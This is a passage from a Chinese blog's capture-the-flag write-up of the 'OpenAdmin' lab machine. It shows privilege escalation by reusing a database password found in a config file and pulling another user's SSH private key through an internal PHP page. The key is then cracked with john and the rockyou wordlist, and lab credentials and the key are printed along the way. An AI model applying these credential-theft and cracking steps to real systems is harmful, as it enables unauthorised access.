<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sh$ ls &#x2F;home&#x2F;</span><br><span class="line">jimmy</span><br><span class="line">joanna</span><br><span class="line">sh$ ls &#x2F;home&#x2F;jimmy</span><br><span class="line">ls: cannot open directory &#39;&#x2F;home&#x2F;jimmy&#39;: Permission denied</span><br><span class="line">sh$ ls &#x2F;home&#x2F;joanna</span><br><span class="line">ls: cannot open directory &#39;&#x2F;home&#x2F;joanna&#39;: Permission denied</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>发现两个用户<code>jimmy</code>  、 <code>joanna</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Linux openadmin 4.15.0-70-generic <span class="comment">#79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">Ubuntu 18.04.3 LTS \n \l</span><br></pre></td></tr></table></figure>

<p>收集到一些密码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /var/www/html/ona/local/config/database_settings.inc.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">    array (</span><br><span class="line">      0 =&gt;</span><br><span class="line">      array (</span><br><span class="line">        'db_type' =&gt; 'mysqli',</span><br><span class="line">        'db_host' =&gt; 'localhost',</span><br><span class="line">        'db_login' =&gt; 'ona_sys',</span><br><span class="line">        'db_passwd' =&gt; 'n1nj4W4rri0R!',</span><br><span class="line">        'db_database' =&gt; 'ona_default',</span><br><span class="line">        'db_debug' =&gt; false,</span><br><span class="line">      ),</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1587382212524-e8e157ab-26e8-4953-acb9-b763fcdddf52.png#align=left&display=inline&height=416&margin=%5Bobject%20Object%5D&name=image.png&originHeight=832&originWidth=1261&size=145666&status=done&style=none&width=630.5" alt="image.png"></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/sierra/contact_process.php</span><br><span class="line">    $to = "rockybd1995@gmail.com";</span><br><span class="line">    ...</span><br><span class="line">       $send = mail($to, $subject, $body, $headers);</span><br></pre></td></tr></table></figure>

<p>用数据库密码，<code>ssh</code>登录上了<code>jimmy</code>的帐号</p>
<h2 id="jimmy-用户"><a href="#jimmy-用户" class="headerlink" title="jimmy 用户"></a>jimmy 用户</h2><p>读文件，发现<code>/var/www/internal</code>下面的文件。这个文件夹在<code>www-data</code>权限下是读不到的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/var/www/internal$ ls</span><br><span class="line">index.php  logout.php  main.php</span><br><span class="line"></span><br><span class="line">jimmy@openadmin:/var/www/internal$ cat main.php</span><br><span class="line">&lt;?php session_start(); if (!isset ($_SESSION['username'])) &#123; header("Location: /index.php"); &#125;;</span><br><span class="line"><span class="comment"># Open Admin Trusted</span></span><br><span class="line"><span class="comment"># OpenAdmin</span></span><br><span class="line">$output = shell_exec('cat /home/joanna/.ssh/id_rsa');</span><br><span class="line">echo "&lt;pre&gt;$output&lt;/pre&gt;";</span><br><span class="line">?&gt;...</span><br><span class="line"></span><br><span class="line">jimmy@openadmin:/var/www/internal$ cat index.php</span><br><span class="line">if (isset($_POST['login']) &amp;&amp; !empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) &#123;</span><br><span class="line">              if ($_POST['username'] == 'jimmy' &amp;&amp;</span><br><span class="line">		hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1')</span><br></pre></td></tr></table></figure>

<p><code>sha512</code>解密:<code>Revealed</code><br>那怎么利用这个<code>main.php</code> 中的<code>shell exec</code>呢。<code>main.php</code>需要我们登录，我这里原本打算采用更改<code>session</code>文件来实现登录态，谁知没权限。。只好找其他方法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/etc/php/7.2/cli$ cat php.ini |grep session.save_path</span><br><span class="line">;session.save_path = "/var/lib/php/sessions"</span><br></pre></td></tr></table></figure>

<p>注意到 52846 端口，看不到进程的细节，应该是跑了个高权限的程序</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/var/www/internal$ lsof -i:52846</span><br><span class="line">jimmy@openadmin:/var/www/internal$  netstat -tunlp</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -</span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php</span><br><span class="line">&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D</span><br><span class="line"></span><br><span class="line">kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8</span><br><span class="line">ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO</span><br><span class="line">ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE</span><br><span class="line">6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ</span><br><span class="line">ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du</span><br><span class="line">y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI</span><br><span class="line">9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4</span><br><span class="line">piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/</span><br><span class="line">/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH</span><br><span class="line">40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ</span><br><span class="line">fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb</span><br><span class="line">9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80</span><br><span class="line">X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg</span><br><span class="line">S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F</span><br><span class="line">FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh</span><br><span class="line">Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa</span><br><span class="line">RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z</span><br><span class="line">uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr</span><br><span class="line">1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2</span><br><span class="line">XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79</span><br><span class="line">yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM</span><br><span class="line">+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt</span><br><span class="line">qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt</span><br><span class="line">z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe</span><br><span class="line">K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN</span><br><span class="line"><span class="comment">-----END RSA PRIVATE KEY-----</span></span><br><span class="line">&lt;/pre&gt;&lt;html&gt;</span><br><span class="line">&lt;h3&gt;Don't forget your "ninja" password&lt;/h3&gt;</span><br><span class="line">Click here to logout &lt;a href="logout.php" tite = "Logout"&gt;Session</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><strong>得到了 joanna 的</strong>私钥，准备用 johntheripper 爆破</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python /usr/share/john/ssh2john.py id_rsa &gt; sshjohn</span><br><span class="line">john <span class="comment">--wordlist=/usr/share/wordlists/rockyou.txt sshjohn</span></span><br></pre></td></tr></table></figure>

<p>不过一开始遇到了问题，<code>rockyou.txt</code>没解压好。用下面的方法解决</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在Kali上，使用以下命令解压缩rocyou.txt.gz文件：</span><br><span class="line"></span><br><span class="line">sudo gunzip /usr/share/wordlists.gz</span><br><span class="line">wc -l /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>``<br>ref:<a href="https://blog.csdn.net/sdihvai/article/details/103953010#jimmy_27" target="_blank" rel="noopener">https://blog.csdn.net/sdihvai/article/details/103953010#jimmy_27</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Unc1e</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/%20%7C%7C%20archive">
              
                  <span class="site-state-item-count">18</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Unc1e</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
